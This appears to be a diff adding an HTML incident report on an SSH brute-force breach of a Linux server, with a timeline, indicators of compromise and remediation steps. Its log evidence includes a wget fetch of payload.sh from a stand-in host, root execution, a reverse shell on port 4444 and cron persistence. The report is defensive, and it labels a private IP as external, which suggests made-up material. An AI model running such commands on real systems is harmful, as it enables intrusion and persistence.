@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Executive Threat Hunting Investigation Report</title>
+    <style>
+        :root {
+            --bg-color: #0f1115;
+            --text-color: #c9d1d9;
+            --accent-color: #58a6ff;
+            --danger-color: #f85149;
+            --warning-color: #d29922;
+            --border-color: #30363d;
+            --table-header-bg: #161b22;
+            --table-row-hover: #1f242c;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            margin: 0;
+            padding: 40px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #0d1117;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        }
+
+        .classification {
+            background-color: rgba(248, 81, 73, 0.1);
+            color: var(--danger-color);
+            border: 1px solid var(--danger-color);
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            letter-spacing: 2px;
+            border-radius: 4px;
+            margin-bottom: 30px;
+        }
+
+        h1, h2, h3 {
+            color: #ffffff;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 8px;
+            margin-top: 40px;
+        }
+
+        h1 { margin-top: 0; font-size: 2em; border-bottom: none; text-align: center; }
+
+        .metadata-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            background: var(--table-header-bg);
+            padding: 20px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+            margin-bottom: 30px;
+        }
+
+        .metadata-grid p { margin: 0; font-size: 0.9em; }
+        .metadata-grid strong { color: var(--accent-color); }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 0.9em;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            background-color: var(--table-header-bg);
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        tr:hover {
+            background-color: var(--table-row-hover);
+        }
+
+        code {
+            font-family: Consolas, Monaco, 'Courier New', monospace;
+            background-color: rgba(110, 118, 129, 0.4);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85em;
+            color: #ff7b72;
+        }
+
+        .severity-badge {
+            background-color: var(--danger-color);
+            color: white;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.8em;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+
+        .phase-card {
+            background: var(--table-header-bg);
+            border-left: 4px solid var(--accent-color);
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .phase-card h3 {
+            margin-top: 0;
+            border-bottom: none;
+            color: var(--accent-color);
+        }
+
+        .footer {
+            margin-top: 50px;
+            text-align: right;
+            font-style: italic;
+            color: #8b949e;
+            border-top: 1px solid var(--border-color);
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="classification">CONFIDENTIAL // INTERNAL USE ONLY</div>
+
+    <h1>Executive Threat Hunting Investigation Report</h1>
+
+    <div class="metadata-grid">
+        <p><strong>Date of Investigation:</strong> June 23, 2026</p>
+        <p><strong>Prepared By:</strong> Senior Threat Hunter</p>
+        <p><strong>Target Environment:</strong> Production Linux Infrastructure</p>
+        <p><strong>Reference ID:</strong> INC-2026-06-23-001</p>
+    </div>
+
+    <h2>1. Executive Summary</h2>
+    <p>During a proactive threat hunting operation aligned with the <strong>MITRE ATT&CK Framework</strong>, our Security Operations Center (SOC) identified a successful breach of a critical Linux server infrastructure. The threat actor, operating from the external IP <code>192.168.1.100</code>, successfully bypassed perimeter defenses, executed a brute-force attack to compromise valid credentials, escalated privileges, and established persistent Command and Control (C2) mechanisms.</p>
+    <p>This report details the complete attack lifecycle, technical evidence collected, and strategic remediation steps required to secure the enterprise environment against this advanced persistent threat (APT) behavior.</p>
+
+    <h2>2. Scope and Objectives</h2>
+    <ul>
+        <li><strong>Objective:</strong> To conduct a proactive, intelligence-driven threat hunt utilizing system logs to detect anomalous behaviors, undocumented persistence mechanisms, and unauthorized lateral movement.</li>
+        <li><strong>Scope:</strong> Syslog, authentication logs (auth.log), firewall logs (iptables), and process execution telemetry.</li>
+    </ul>
+
+    <h2>3. Incident Timeline & Technical Analysis</h2>
+    <p>The attacker executed a highly coordinated attack sequence spanning approximately three minutes.</p>
+
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp (UTC)</th>
+                <th>Phase</th>
+                <th>Technical Description</th>
+                <th>Evidence/Log Snippet</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>10:23:45 - 10:23:51</td>
+                <td>Initial Access Attempt</td>
+                <td>The adversary initiated an automated SSH brute-force attack targeting the <code>root</code> account.</td>
+                <td><code>sshd[4010]: Failed password for root...</code></td>
+            </tr>
+            <tr>
+                <td>10:24:12</td>
+                <td>Initial Access Success</td>
+                <td>The adversary successfully authenticated using compromised credentials for the <code>admin</code> account.</td>
+                <td><code>sshd[4030]: Accepted password for admin...</code></td>
+            </tr>
+            <tr>
+                <td>10:25:01</td>
+                <td>Privilege Escalation & Tool Transfer</td>
+                <td>Operating as <code>admin</code>, the attacker utilized <code>sudo</code> to download a malicious payload (<code>payload.sh</code>) via <code>wget</code>.</td>
+                <td><code>COMMAND=/usr/bin/wget http://malicious-server.xyz/payload.sh</code></td>
+            </tr>
+            <tr>
+                <td>10:25:15</td>
+                <td>Execution</td>
+                <td>The downloaded payload was executed with elevated (<code>root</code>) privileges using the bash interpreter.</td>
+                <td><code>COMMAND=/bin/bash /tmp/payload.sh</code></td>
+            </tr>
+            <tr>
+                <td>10:25:30</td>
+                <td>Command and Control (C2)</td>
+                <td>A reverse shell connection was attempted to the attacker's infrastructure over TCP port 4444. Dropped by iptables.</td>
+                <td><code>kernel: iptables: DROP... DPT=4444</code></td>
+            </tr>
+            <tr>
+                <td>10:26:00</td>
+                <td>Persistence</td>
+                <td>The attacker modified the system crontab to execute the malicious payload periodically.</td>
+                <td><code>crond[4105]: (root) CMD (/tmp/payload.sh...)</code></td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>4. Threat Intelligence & Indicators of Compromise (IoCs)</h2>
+    <p>To facilitate immediate containment across the enterprise, the following IoCs have been extracted:</p>
+    <ul>
+        <li><strong>IPv4 Addresses:</strong> <code>192.168.1.100</code> (Attacker IP), <code>10.0.0.5</code> (Targeted Asset)</li>
+        <li><strong>Domains/URLs:</strong> <code>http://malicious-server.xyz</code> (Payload Delivery Network)</li>
+        <li><strong>File Artifacts:</strong> <code>/tmp/payload.sh</code> (Malicious Bash Script)</li>
+        <li><strong>Behavioral Anomalies:</strong> <code>wget</code> execution originating from an interactive SSH session.</li>
+    </ul>
+
+    <h2>5. Risk Assessment & Business Impact</h2>
+    <p>Severity Rating: <span class="severity-badge">CRITICAL</span></p>
+    <p><strong>Impact:</strong> The attacker successfully achieved <code>root</code> level privileges. While the immediate C2 connection was intercepted by firewall rules, the established persistence mechanism via <code>crontab</code> means the system remains compromised. Immediate remediation is required to prevent data exfiltration or ransomware deployment.</p>
+
+    <h2>6. Strategic & Tactical Remediation</h2>
+
+    <div class="phase-card">
+        <h3>Phase 1: Immediate Containment (0-24 Hours)</h3>
+        <ol>
+            <li><strong>Network Isolation:</strong> Immediately isolate the compromised server (<code>10.0.0.5</code>) from the corporate network.</li>
+            <li><strong>Account Revocation:</strong> Terminate all active SSH sessions and reset passwords for the <code>admin</code> and <code>root</code> accounts.</li>
+            <li><strong>IoC Blocking:</strong> Blacklist <code>192.168.1.100</code> and <code>malicious-server.xyz</code> at the perimeter firewalls.</li>
+        </ol>
+    </div>
+
+    <div class="phase-card">
+        <h3>Phase 2: Eradication & Recovery (24-72 Hours)</h3>
+        <ol>
+            <li><strong>Artifact Removal:</strong> Remove the malicious payload (<code>/tmp/payload.sh</code>) and delete the unauthorized cron job entries.</li>
+            <li><strong>Forensic Image:</strong> Capture a memory and disk image for deeper forensic analysis.</li>
+            <li><strong>System Rebuild:</strong> Due to the root-level compromise, the server must be rebuilt from a known good baseline image.</li>
+        </ol>
+    </div>
+
+    <div class="phase-card">
+        <h3>Phase 3: Strategic Hardening (Long-Term)</h3>
+        <ol>
+            <li><strong>Implement Multi-Factor Authentication (MFA):</strong> Mandate MFA for all SSH access to neutralize credential compromise.</li>
+            <li><strong>Disable Root SSH Login:</strong> Modify <code>/etc/ssh/sshd_config</code> to set <code>PermitRootLogin no</code>.</li>
+            <li><strong>Deploy EDR:</strong> Roll out Endpoint Detection and Response agents to all critical infrastructure.</li>
+        </ol>
+    </div>
+
+    <div class="footer">
+        Threat Hunting Division, Cyber Defense Team
+    </div>
+
+</div>
+
+</body>
+</html>
